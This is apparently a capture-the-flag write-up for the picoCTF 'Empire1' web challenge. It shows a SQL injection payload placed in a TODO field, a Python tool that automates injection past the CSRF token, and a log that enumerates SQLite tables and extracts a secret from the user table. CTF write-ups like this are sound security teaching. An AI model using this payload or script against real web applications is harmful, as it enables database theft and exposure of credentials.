# Empire1
Web Exploitation, 400 points

## Description:
> Psst, Agent 513, now that you're an employee of Evil Empire Co., try to get their secrets off the company website. https://2019shell1.picoctf.com/problem/45012/ Can you first find the secret code they assigned to you?


## Solution: 

The attached website provides registration and login pages, which do not seem to contain any vulnerabilities.

After registering and signing in, the service allows submitting a TODO via the following form:

```html
<form action="" method="post"
  class="form" role="form">
  <input id="csrf_token" name="csrf_token" type="hidden" value="IjI0ZjFiNTQ2ZmZiY2Q0ZTkzYzBlYTE4NWZmZjg5ZWFiNmVkMGM2ZDgi.XaDrHw.j2B7AzusTP7lPFthEkrCXCp-2qM">
  <div class="form-group  required"><label class="control-label" for="item">Todo?</label>
    <input class="form-control" id="item" name="item" required type="text" value="">      
  </div>
  <input class="btn btn-default" id="submit" name="submit" type="submit" value="Create">
</form>
```

The result is later available on another page, for example:
```html
<h1 class="page-header">Things You Gotta Do</h1>
<ul class="list-unstyled">
    <div class="row">
        <div class="col-md-6">
            <div class="well well-sm">
                <li>
                <strong>Very Urgent:</strong> Test
                </li> 
            </div>
        </div>
    </div>
</ul>
```

The "Very Urgent:" prefix is automatically prepended to any text provided by the user.

After trying different strategies, I found that the page is vulnerable to SQL injection using the following syntax:
```
'||(SQL)||'
```

For example:
```
'||(select tbl_name FROM sqlite_master WHERE type='table' limit 0,1 COLLATE NOCASE)||'
```

Using the following interactive shell, it is possible to test different SQL queries and see the result:

```python
import re
import html
import requests
from cmd import Cmd
from bs4 import BeautifulSoup

class Empire1(object):
    BASE_URL = "https://2019shell1.picoctf.com/problem/45012"
    
    def __init__(self):
        self.session = requests.Session() 
        
    def login(self, username, password):
        text = self.post(self.BASE_URL + "/login", {"username": username, "password": password})
        if "Invalid username or password" in text:
            raise Exception("Can't login")

    def post(self, uri, data):
        r = self.session.get(uri, headers = {"Referer": uri})
        csrf = self.get_csrf_token(r.text)
        d = {"csrf_token": csrf}
        d.update(data)
        r = self.session.post(uri, data = d, allow_redirects = True, headers = {"Referer": uri})
        if r.status_code != 200:
            raise Exception("Can't post to '{}'".format(uri))
        return r.text

    def add_item(self, item):
        text = self.post(self.BASE_URL + "/add_item", {"item": item})
        if "Item Added" not in text:
            raise Exception("Can't add item '{}'".format(item))

    def get_last_item(self):
        r = self.session.get(self.BASE_URL + "/list_items")
        parsed_html = BeautifulSoup(r.text, "lxml")
        return parsed_html.body.find_all('div', attrs={'class':'well well-sm'})[-1].findChildren("li" , recursive=False)[0].get_text().replace("Very Urgent: ", "")


    def get_csrf_token(self, html):
        token = re.search(r'<input id="csrf_token" name="csrf_token" type="hidden" value="([^"]+)">', html, re.MULTILINE)
        if token is None:
            raise Exception("Can't find CSRF token")
        return token.group(1)

class MyPrompt(Cmd):
    def __init__(self):
        Cmd.__init__(self)
        self.site = Empire1()
        self.site.login("user", "password")
        print "Logged in"

    def do_exit(self, inp):
        return True
 
    def do_send(self, param):
        q = "'||({})||'".format(param)
        self.site.add_item(q)
        print self.site.get_last_item()
 
MyPrompt().cmdloop()
```

The script assumes that we've already registered with the `user:password` credentials. It also requires prepending the command `send` to each SQL command, in order to trigger `do_send`.

The DB used for this website is SQLite. We first leak the tables and table structure using `sqlite_master`, then we search for the flag within the DB.

```console
root@kali:/media/sf_CTFs/pico/Empire1# python shell.py
Logged in
(Cmd) send select tbl_name FROM sqlite_master WHERE type='table' limit 0,1 COLLATE NOCASE

user

(Cmd) send select tbl_name FROM sqlite_master WHERE type='table' limit 1,1 COLLATE NOCASE

todo

(Cmd) send select tbl_name FROM sqlite_master WHERE type='table' limit 2,1 COLLATE NOCASE

None

(Cmd) send select sql FROM sqlite_master WHERE type='table' limit 0,1 COLLATE NOCASE

CREATE TABLE user (
        id INTEGER NOT NULL,
        username VARCHAR(64),
        name VARCHAR(128),
        password_hash VARCHAR(128),
        secret VARCHAR(128),
        admin INTEGER,
        PRIMARY KEY (id)
)

(Cmd) send select sql FROM sqlite_master WHERE type='table' limit 1,1 COLLATE NOCASE

CREATE TABLE todo (
        id INTEGER NOT NULL,
        item VARCHAR(256),
        user_id INTEGER,
        PRIMARY KEY (id),
        FOREIGN KEY(user_id) REFERENCES user (id)
)

(Cmd) send select item FROM todo where item like '%picoCTF%' limit 0,1 COLLATE NOCASE

None

(Cmd) send select secret FROM user where secret like '%picoCTF%' limit 0,1 COLLATE NOCASE

picoCTF{wh00t_it_a_sql_injecta60643ae}

(Cmd) exit
```

